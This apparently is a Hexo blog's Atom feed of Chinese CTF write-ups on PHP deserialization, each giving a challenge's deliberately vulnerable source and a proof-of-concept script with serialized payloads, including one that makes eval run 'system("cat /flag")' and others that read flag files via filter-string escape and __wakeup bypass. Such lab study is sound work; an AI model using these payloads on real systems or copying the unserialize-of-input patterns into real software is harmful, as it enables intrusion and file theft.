<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S-H-BF</title>
  
  <subtitle>Sonder39的博客</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-12-23T04:42:29.481Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Sonder39</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/12/24/hello-world/"/>
    <id>http://example.com/2023/12/24/hello-world/</id>
    <published>2023-12-23T18:27:45.929Z</published>
    <updated>2023-12-23T04:42:29.481Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>serCat7</title>
    <link href="http://example.com/2023/12/22/serCat7/"/>
    <id>http://example.com/2023/12/22/serCat7/</id>
    <published>2023-12-22T13:57:23.000Z</published>
    <updated>2023-12-23T04:42:29.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serCat7"><a href="#serCat7" class="headerlink" title="serCat7"></a>serCat7</h1><p>[安洵杯 2019]easy_serialize_php Blu3Boy</p><p><strong><a href="https://githubfast.com/D0g3-Lab/i-SOON_CTF_2019/">https://githubfast.com/D0g3-Lab/i-SOON_CTF_2019/</a></strong><br><strong><a href="https://blog.csdn.net/xhy18634297976/article/details/123123497">https://blog.csdn.net/xhy18634297976/article/details/123123497</a></strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$filter_arr</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$function</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?Sonder=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><ol><li>访问<a href="http://ctf.seek2.top:33020/index.php?Sonder=phpinfo%EF%BC%8C%E5%BE%97%E5%88%B0%E6%8F%90%E7%A4%BAauto_append_file%E7%9A%84%E5%80%BC%E4%B8%BAd0g3_f1ag.php">http://ctf.seek2.top:33020/index.php?Sonder=phpinfo，得到提示auto_append_file的值为d0g3_f1ag.php</a>;</li><li>&#x2F;index.php?f&#x3D;show_image,<code>php$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);</code>满足条件后触发反序列化<code>$userinfo = unserialize($serialize_info);</code>,<code>file_get_contents()</code>输出文件<code>$img</code>的内容;</li><li>preg_replace($filter, ‘’, $img);会过滤特定字符出，导致字符串逃逸漏洞。</li></ol><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//stick-serCat7</span></span><br><span class="line"><span class="comment">//[安洵杯 2019]easy_serialize_php Blu3Boy</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$filter_arr</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span>; <span class="comment">// d0g3_f1ag.php base64编码</span></span><br><span class="line"><span class="comment">//echo serialize($_SESSION);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?Sonder=show_image</span><br><span class="line"></span><br><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line"></span><br><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serCat7&quot;&gt;&lt;a href=&quot;#serCat7&quot; class=&quot;headerlink&quot; title=&quot;serCat7&quot;&gt;&lt;/a&gt;serCat7&lt;/h1&gt;&lt;p&gt;[安洵杯 2019]easy_serialize_php Blu3Boy&lt;/p&gt;
&lt;p&gt;&lt;stron</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serCat6</title>
    <link href="http://example.com/2023/12/22/serCat6/"/>
    <id>http://example.com/2023/12/22/serCat6/</id>
    <published>2023-12-22T13:56:23.000Z</published>
    <updated>2023-12-23T04:42:29.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serCat6"><a href="#serCat6" class="headerlink" title="serCat6"></a>serCat6</h1><p>[HNCTF 2022 WEEK2]easy_unser</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>, <span class="variable">$todonothing</span> = <span class="string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is unserialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="variable">$but</span> = <span class="string">&quot;I can CHANGE you&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;want = <span class="variable">$but</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;C1ybaby!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;So,let me see if you can get what you want\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;鲍勃,别傻愣着!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;flag.php&quot;</span> <span class="keyword">or</span> <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is serialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is used as a string,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;CORE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">unserializeorder</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ywant</span> = @<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ywant</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//stick-serCat6</span></span><br><span class="line"><span class="comment">//[HNCTF 2022 WEEK2]easy_unser</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span> = <span class="string">&#x27;php://filter/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$todonothing</span> = <span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Body</span> = <span class="keyword">new</span> <span class="title function_ invoke__">body</span>();</span><br><span class="line"><span class="comment">//echo serialize($Body);</span></span><br><span class="line"><span class="comment">//O:4:&quot;body&quot;:2:&#123;s:10:&quot; body want&quot;;s:30:&quot;php://filter/resource=flag.php&quot;;s:17:&quot; body todonothing&quot;;s:6:&quot;benben&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;O:4:&quot;body&quot;:3:&#123;S:10:&quot;\00body\00want&quot;;s:30:&quot;php://filter/resource=flag.php&quot;;S:17:&quot;\00body\00todonothing&quot;;s:6:&quot;benben&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22body%22%3A3%3A%7BS%3A10%3A%22%5C00body%5C00want%22%3Bs%3A30%3A%22php%3A%2F%2Ffilter%2Fresource%3Dflag.php%22%3BS%3A17%3A%22%5C00body</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serCat6&quot;&gt;&lt;a href=&quot;#serCat6&quot; class=&quot;headerlink&quot; title=&quot;serCat6&quot;&gt;&lt;/a&gt;serCat6&lt;/h1&gt;&lt;p&gt;[HNCTF 2022 WEEK2]easy_unser&lt;/p&gt;
&lt;figure class=&quot;hi</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serCat5</title>
    <link href="http://example.com/2023/12/22/serCat5/"/>
    <id>http://example.com/2023/12/22/serCat5/</id>
    <published>2023-12-22T13:55:23.000Z</published>
    <updated>2023-12-23T04:42:29.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serCat5"><a href="#serCat5" class="headerlink" title="serCat5"></a>serCat5</h1><p>[UUCTF 2022 新生赛]ez_unser debug002</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>, <span class="variable">$a</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//stick-serCat5</span></span><br><span class="line"><span class="comment">//[UUCTF 2022 新生赛]ez_unser debug002</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//    public $c=&#x27;system(&quot;ls /&quot;);&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>=<span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$Test</span> -&gt;a =&amp;<span class="variable">$Test</span> -&gt;b;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$Test</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serCat5&quot;&gt;&lt;a href=&quot;#serCat5&quot; class=&quot;headerlink&quot; title=&quot;serCat5&quot;&gt;&lt;/a&gt;serCat5&lt;/h1&gt;&lt;p&gt;[UUCTF 2022 新生赛]ez_unser debug002&lt;/p&gt;
&lt;figure clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serCat4</title>
    <link href="http://example.com/2023/12/22/serCat4/"/>
    <id>http://example.com/2023/12/22/serCat4/</id>
    <published>2023-12-22T13:54:23.000Z</published>
    <updated>2023-12-23T04:42:29.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serCat4"><a href="#serCat4" class="headerlink" title="serCat4"></a>serCat4</h1><p>[SWPUCTF 2022 新生赛]ez_ez_unserialize</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$x</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x !== <span class="keyword">__FILE__</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;x = <span class="keyword">__FILE__</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        <span class="comment">//flag is in flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sonder&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//stick-serCat4</span></span><br><span class="line"><span class="comment">//[SWPUCTF 2022 新生赛]ez_ez_unserialize</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">X</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serCat4&quot;&gt;&lt;a href=&quot;#serCat4&quot; class=&quot;headerlink&quot; title=&quot;serCat4&quot;&gt;&lt;/a&gt;serCat4&lt;/h1&gt;&lt;p&gt;[SWPUCTF 2022 新生赛]ez_ez_unserialize&lt;/p&gt;
&lt;figure cl</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serCat3</title>
    <link href="http://example.com/2023/12/22/serCat3/"/>
    <id>http://example.com/2023/12/22/serCat3/</id>
    <published>2023-12-22T13:53:23.000Z</published>
    <updated>2023-12-23T04:42:29.614Z</updated>
    
